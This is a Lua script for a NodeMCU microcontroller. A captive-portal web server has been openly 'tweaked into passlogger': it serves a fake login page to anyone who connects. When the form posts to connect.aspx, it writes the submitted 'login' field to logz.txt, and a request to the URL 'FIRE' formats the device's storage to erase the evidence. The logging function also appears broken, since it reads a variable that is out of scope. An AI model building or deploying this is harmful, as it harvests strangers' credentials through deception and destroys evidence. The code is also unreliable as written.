--[[
CaptiveIntraweb HTTP Server
Modified by Andy Reischle
Blog at: www.areresearch.net
Youtube: www.youtube.com/AReResearch

Based on 
XChip's NodeMCU IDE

PARAMETERS: handle field name is 'login', terminate is 'FIRE'.

tweaked into passlogger by dv4n on git.
]]--

srv=net.createServer(net.TCP) 
srv:listen(80,function(conn) 

   local rnrn=0
   local Status = 0
   local DataToGet = 0
   local method=""
   local url=""
   local vars=""

  conn:on("receive",function(conn,payload)
  
    if Status==0 then
        _, _, method, url, vars = string.find(payload, "([A-Z]+) /([^?]*)%??(.*) HTTP")
        -- print(method, url, vars)                          
    end

	if url==nil then
		url="index.htm"
	end
	
	if url=="" then
		url="index.htm"
	end
	
	-- some ugly magic for Apple IOS Devices
	if string.find(url, "/") ~= nil then
	 --print ("Slash found")
	 local invurl=string.reverse(url)
	 local a,b=string.find(invurl, "/", 1)
	 url=string.sub(url, string.len(url)-(a-2))
	 --print ("Neue URL= " .. url)
	end
		
	if string.len(url)>= 25 then
		url = string.sub (url,1,25)
	--	print ("cut down URL")
	end
	
   
    DataToGet = -1

	
    conn:send("HTTP/1.1 200 OK\r\n\r\n")

	
	local a = 'index.html'


	-- LOG CREDS
	if url == "connect.aspx" then
	  log()
	end


	-- TERMINATE EVERYTHING
	if url == "FIRE" then
		file.format()
	end


	-- REDIRECT TO HOME PAGE
if url ~= a then
    url=a
end

	

		
    -- it wants a file in particular
    if url~="" then
        DataToGet = 0
        return
    end    

  
  end)
  
  conn:on("sent",function(conn) 
    if DataToGet>=0 and method=="GET" then
        if file.open(url, "r") then            
            file.seek("set", DataToGet)
            local line=file.read(512)
            file.close()
            if line then
                conn:send(line)
				-- print ("sending:" .. DataToGet)
                DataToGet = DataToGet + 512    
                if (string.len(line)==512) then
                    return
                end
            end
        end        
    end

    conn:close() 
  end)
end)

function log()
    file.open("logz.txt", "a+")
    file.write(string.find(payload, "login(.*)"))
    file.flush()
    file.close()
    node.restart()
end

	
print("HTTP Server is now listening. Free Heap:", node.heap())

